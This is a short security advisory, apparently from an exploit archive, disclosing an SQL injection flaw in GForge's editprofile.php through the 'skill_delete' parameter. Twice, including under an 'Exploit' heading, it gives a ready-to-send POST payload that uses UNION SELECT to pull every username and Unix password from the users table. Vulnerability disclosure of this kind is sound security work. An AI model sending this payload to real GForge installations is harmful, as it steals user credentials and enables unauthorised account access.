@@ -1,0 +1,35 @@
+Sql Injection Vulnerability In GForge
+
+Portcullis Security Advisory 07-014
+
+Vulnerable System: All current versions till 4.6b2
+
+Vulnerability Title: Sql Injection
+
+Vulnerability Discovery and Development: Portcullis Security Testing Services.
+
+Credit for Discovery: Summit Siddharth - Portcullis Computer Security Ltd.
+
+Affected systems: N/A
+
+Vendor Status: emailed vendor 17/08/2007
+
+Details:
+
+vulnerable script:- /www/people/editprofile.php
+
+'skill_delete' parameter is not properly sanitized. The following POST request made to the vulnerable script will result in disclosure of all the usernames/password stored in the backend databases.
+
+skill_delete%5B%5D=484)+UNION+ALL+SELECT+user_name||unix_pw+from+users--%3d1&MultiDelete=Delete
+
+Impact: This could lead to unauthorized access of information.
+
+Exploit:
+
+POST request to:/www/people/editprofile.php
+
+skill_delete%5B%5D=484)+UNION+ALL+SELECT+user_name||unix_pw+from+users--%3d1&MultiDelete=Delete .
+
+This will work irrespective of the 'magic_quotes_gpc' php setting. 
+
+# milw0rm.com [2007-09-13]
